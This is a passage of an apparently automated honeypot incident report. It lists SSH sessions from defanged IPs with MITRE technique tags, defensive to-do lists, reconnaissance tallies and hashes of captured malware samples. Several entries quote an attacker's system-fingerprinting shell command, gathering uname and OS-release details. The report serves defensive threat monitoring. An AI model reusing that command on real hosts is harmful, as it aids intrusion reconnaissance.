| `2026-07-25 10:44:26` | `cowrie.session.params` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.success` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.command.input` |
| `2026-07-25 10:44:26` | `cowrie.log.closed` |
| `2026-07-25 10:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5d8c0a1923

| Field | Detail |
|---|---|
| **Source IP** | `122.169.97[.]132` |
| **First Seen** | 2026-07-25 10:44 |
| **Last Seen** | 2026-07-25 10:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:44:30` | `cowrie.session.connect` |
| `2026-07-25 10:44:31` | `cowrie.client.version` |
| `2026-07-25 10:44:31` | `cowrie.client.kex` |
| `2026-07-25 10:44:33` | `cowrie.login.success` |
| `2026-07-25 10:44:33` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.169.97[.]132` to AbuseIPDB if not already reported
- [ ] Block `122.169.97[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b831addfdf

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-07-25 10:45 |
| **Last Seen** | 2026-07-25 10:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:45:44` | `cowrie.session.connect` |
| `2026-07-25 10:45:45` | `cowrie.client.version` |
| `2026-07-25 10:45:45` | `cowrie.client.kex` |
| `2026-07-25 10:45:46` | `cowrie.login.success` |
| `2026-07-25 10:45:46` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d98849e232

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-07-25 10:45 |
| **Last Seen** | 2026-07-25 10:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:45:56` | `cowrie.session.connect` |
| `2026-07-25 10:45:56` | `cowrie.client.version` |
| `2026-07-25 10:45:56` | `cowrie.client.kex` |
| `2026-07-25 10:45:58` | `cowrie.login.success` |
| `2026-07-25 10:45:59` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c627ff69ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:46 |
| **Last Seen** | 2026-07-25 10:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:46:15` | `cowrie.session.connect` |
| `2026-07-25 10:46:15` | `cowrie.client.version` |
| `2026-07-25 10:46:15` | `cowrie.client.kex` |
| `2026-07-25 10:46:17` | `cowrie.login.success` |
| `2026-07-25 10:46:19` | `cowrie.session.params` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.success` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.command.input` |
| `2026-07-25 10:46:19` | `cowrie.log.closed` |
| `2026-07-25 10:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484a73c5bc27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:48 |
| **Last Seen** | 2026-07-25 10:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:48:11` | `cowrie.session.connect` |
| `2026-07-25 10:48:11` | `cowrie.client.version` |
| `2026-07-25 10:48:11` | `cowrie.client.kex` |
| `2026-07-25 10:48:12` | `cowrie.login.success` |
| `2026-07-25 10:48:14` | `cowrie.session.params` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.success` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:14` | `cowrie.command.input` |
| `2026-07-25 10:48:15` | `cowrie.log.closed` |
| `2026-07-25 10:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d81f7b6abb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:50 |
| **Last Seen** | 2026-07-25 10:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:50:01` | `cowrie.session.connect` |
| `2026-07-25 10:50:02` | `cowrie.client.version` |
| `2026-07-25 10:50:02` | `cowrie.client.kex` |
| `2026-07-25 10:50:04` | `cowrie.login.success` |
| `2026-07-25 10:50:05` | `cowrie.session.params` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.success` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:05` | `cowrie.command.input` |
| `2026-07-25 10:50:06` | `cowrie.log.closed` |
| `2026-07-25 10:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bf149d29bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:51 |
| **Last Seen** | 2026-07-25 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:51:53` | `cowrie.session.connect` |
| `2026-07-25 10:51:53` | `cowrie.client.version` |
| `2026-07-25 10:51:53` | `cowrie.client.kex` |
| `2026-07-25 10:51:55` | `cowrie.login.success` |
| `2026-07-25 10:51:56` | `cowrie.session.params` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.success` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:56` | `cowrie.command.input` |
| `2026-07-25 10:51:57` | `cowrie.log.closed` |
| `2026-07-25 10:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e414134d3d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:53 |
| **Last Seen** | 2026-07-25 10:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:53:48` | `cowrie.session.connect` |
| `2026-07-25 10:53:49` | `cowrie.client.version` |
| `2026-07-25 10:53:49` | `cowrie.client.kex` |
| `2026-07-25 10:53:50` | `cowrie.login.success` |
| `2026-07-25 10:53:52` | `cowrie.session.params` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.success` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.command.input` |
| `2026-07-25 10:53:52` | `cowrie.log.closed` |
| `2026-07-25 10:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `207.175.46[.]25` | **30** | 2026-07-25 09:02 | 2026-07-25 09:02 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.136[.]59` | **30** | 2026-07-25 09:15 | 2026-07-25 09:15 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.53.246[.]179` | **30** | 2026-07-25 09:37 | 2026-07-25 09:37 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-25 09:05 | 2026-07-25 10:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]39` | **3** | 2026-07-25 09:38 | 2026-07-25 09:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-25 09:01 | 2026-07-25 09:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-25 09:28 | 2026-07-25 09:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]94` | **3** | 2026-07-25 10:08 | 2026-07-25 10:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-25 10:52 | 2026-07-25 10:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-25 10:26 | 2026-07-25 10:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **3** | 2026-07-25 09:01 | 2026-07-25 10:35 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.213[.]95` | **2** | 2026-07-25 10:08 | 2026-07-25 10:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-25 09:57 | 2026-07-25 09:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.183[.]177` | **2** | 2026-07-25 09:06 | 2026-07-25 09:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `110.78.165[.]192` | 1 | 2026-07-25 09:03 | 2026-07-25 09:03 | 6s | 0 | `T1592` | 🟢 LOW |
| `115.190.213[.]72` | 1 | 2026-07-25 09:28 | 2026-07-25 09:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.230.9[.]15` | 1 | 2026-07-25 10:45 | 2026-07-25 10:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `116.99.170[.]251` | 1 | 2026-07-25 09:48 | 2026-07-25 09:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.99.172[.]197` | 1 | 2026-07-25 10:22 | 2026-07-25 10:23 | 95s | 0 | `T1592` | 🟢 LOW |
| `117.2.123[.]19` | 1 | 2026-07-25 10:21 | 2026-07-25 10:21 | 1s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]44` | 1 | 2026-07-25 09:33 | 2026-07-25 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.235.2[.]221` | 1 | 2026-07-25 09:20 | 2026-07-25 09:20 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-07-25 09:31 | 2026-07-25 09:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.178.246[.]43` | 1 | 2026-07-25 10:43 | 2026-07-25 10:43 | 9s | 0 | `T1592` | 🟢 LOW |
| `42.248.129[.]234` | 1 | 2026-07-25 09:53 | 2026-07-25 09:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.118.146[.]219` | 1 | 2026-07-25 09:29 | 2026-07-25 09:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-25 10:07 | 2026-07-25 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-07-25 09:36 | 2026-07-25 09:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-25 09:36 | 2026-07-25 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.129.182[.]164` | 1 | 2026-07-25 09:39 | 2026-07-25 09:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `61.178.209[.]47` | 1 | 2026-07-25 09:01 | 2026-07-25 09:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.20.174[.]49` | 1 | 2026-07-25 09:32 | 2026-07-25 09:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]108` | 1 | 2026-07-25 09:33 | 2026-07-25 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-25 09:27 | 2026-07-25 09:27 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-07-25 10:01 | 2026-07-25 10:02 | 77s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
